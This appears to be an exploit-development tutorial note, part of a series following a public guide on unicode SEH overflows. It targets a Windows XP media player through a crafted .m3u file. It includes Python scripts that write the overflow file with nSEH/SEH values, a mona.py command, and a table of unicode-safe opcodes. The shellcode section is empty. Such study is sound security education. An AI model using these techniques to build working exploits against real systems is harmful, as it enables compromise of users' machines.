# Part4: From 0x00410041 to calc

## Get things setup
1. winxp sp3
2. [vulnerable software](http://dw.com.com/redir?edId=3&siteId=4&oId=3000-2139_4-10691520&ontId=2139_4&spi=56d8806b97a1398c96c63ce1081bdbb6&lop=link&tag=tdw_dltext&ltype=dl_dlnow&pid=10694507&mfgId=6294769&merId=6294769&pguid=T2ATdQoOYJIAADBo9roAAAM2&ttag=dl_dldirect&destUrl=http%3A%2F%2Fdownload.cnet.com%2F3001-2139_4-10691520.html%3Fspi%3D56d8806b97a1398c96c63ce1081bdbb6%26dlm%3D0)

## Background

```
buffer_size = 5000
buffer = "A" * buffer_size

try:
    print "[+] Creating exploit file.."
    exploit = open('triologic.m3u','w');
    exploit.write(buffer);
    exploit.close();
    print "[+] Writing", len(buffer), "bytes to triologic.m3u"
    print "[+] Exploit file created!"
except:
    print "[-] Error: You do not have correct permissions.."

```


![](Part4-From0x00410041toCalc/Part4-From0x00410041toCalc0.png)

![](Part4-From0x00410041toCalc/Part4-From0x00410041toCalc1.png)

In this case, we can still follow the same thinking in past SEH exploit, but need to find a new bunch of instructions to adapt unicode format.

1. Find unicode compatible "Pop Pop Ret" address for SEH
```
> mona.py seh -cp unicode
```
2. Find the execute harmless instructions for nSEH
Short Jump instruction in previous SEH exploit blog were used to jump over SEH to shellcode, in this case, we can find the execute harmless instructions to walk over nSEH and SEH

For example, if nSEH = "\x61\x6E" and the location pointed by esi is writable, 

here is the unicode format
```
\x61          popads

\x00\x72\x00  add byte ptr [edx],dh
```

As we can see, "\x72" could "eat away" the null bytes and make the exploit run harmless. Besides, "\x61" is a useful instruction, let's talk it later.

You can choose one of following incturcions depends on your case.

```
00 6E 00:add byte ptr [esi],ch
00 6F 00:add byte ptr [edi],ch
00 70 00:add byte ptr [eax],dh
00 71 00:add byte ptr [ecx],dh
00 72 00:add byte ptr [edx],dh
00 73 00:add byte ptr [ebx],dh
(62, 6d are 2 others that can be used â€“ be creative & see what works for you)
```


3. Similarl, to walk over SEH, we have to make sure the unicode compatible "Pop Pop Ret" is execute harmless.

## Walk Over SEH

![](Part4-From0x00410041toCalc/Part4-From0x00410041toCalc2.png)

```
buffer_size = 5000

junk = "A" * 536
nSEH = "\x61\x72"
SEH = "\x41\x4a"

buffer = junk + nSEH + SEH
buffer += "\xCC" * (buffer_size - len(buffer))

try:
    print "[+] Creating exploit file.."
    exploit = open('triologic.m3u','w');
    exploit.write(buffer);
    exploit.close();
    print "[+] Writing", len(buffer), "bytes to triologic.m3u"
    print "[+] Exploit file created!"
except:
    print "[-] Error: You do not have correct permissions.."
```

![](Part4-From0x00410041toCalc/Part4-From0x00410041toCalc3.png)

## Execute Shellcode





## Ref
1. https://www.corelan.be/index.php/2009/11/06/exploit-writing-tutorial-part-7-unicode-from-0x00410041-to-calc/



